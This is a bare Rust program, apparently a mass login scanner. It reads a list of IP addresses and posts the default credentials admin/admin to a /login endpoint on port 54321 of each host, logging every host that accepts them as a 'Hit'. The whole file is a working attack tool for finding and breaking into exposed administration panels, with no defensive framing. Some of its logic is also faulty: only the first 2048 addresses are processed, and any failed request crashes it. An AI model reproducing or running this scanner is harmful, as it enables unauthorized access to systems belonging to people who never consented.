use tokio::time::Instant;
use std::io::{BufRead, BufReader, Write};
use std::fs::{File, OpenOptions};
use serde_json::Value; 


const CONCURRENT_REQUESTS: usize = 2048;

fn generate_urls(filename: &str) -> Vec<String> {
    let mut ips = Vec::new();
    let file = File::open(&filename).expect("Failed to open file"); 
    let reader = BufReader::new(file);
    for line in reader.lines() {
        let ip = line.expect("Failed to read line").trim().to_string();
        ips.push(ip);
    }
    ips
}
async fn send_request(ip: &str) {
    let url = format!("http://{}:{}/login", ip, "54321");
    let data = vec![
        ("username", "admin"),
        ("password", "admin"),
    ];

    let response =  reqwest::Client::new()
        .post(&url)
        .form(&data)
        .timeout(std::time::Duration::from_secs(5))
        .send()
        .await
        .unwrap();


    if response.status().is_success() {
        let response_text = response.text().await.unwrap();
        let response_json: Value = serde_json::from_str(&response_text).unwrap();
        if response_json["success"] == true {
            println!("Hit: {}", ip);
            let mut results_file = OpenOptions::new() 
            .append(true)
            .open("output")
            .expect("Failed to open file");
        
            results_file.write((ip.to_owned()+"\n").as_bytes()).expect("Failed to write file");
            return
        } else {
            return
        }
    } else {
        return
    }

}
#[tokio::main]
async fn main() {
    let mut filename = String::new();
    std::io::stdin().read_line(&mut filename).expect("Failed to read line");
    let filename = filename.trim().to_string();
    let ips = generate_urls(&filename);
    println!("Total number of IPs: {}", ips.len());
    let start_time = Instant::now();
    if  !std::path::Path::new("output").exists() {
        File::create("output").expect("Failed to create file");
    }
    let tasks = ips.into_iter().map(|ip| {
        tokio::spawn(async move {
            send_request(&ip).await;
        })
    });

    let limited_tasks: Vec<_> = tasks.take(CONCURRENT_REQUESTS).collect();

    tokio::join!(async {
        for task in limited_tasks {
            let _ = task.await;
        }
    });

    let elapsed_time = start_time.elapsed();
    println!("Total time taken: {:?}", elapsed_time);
}
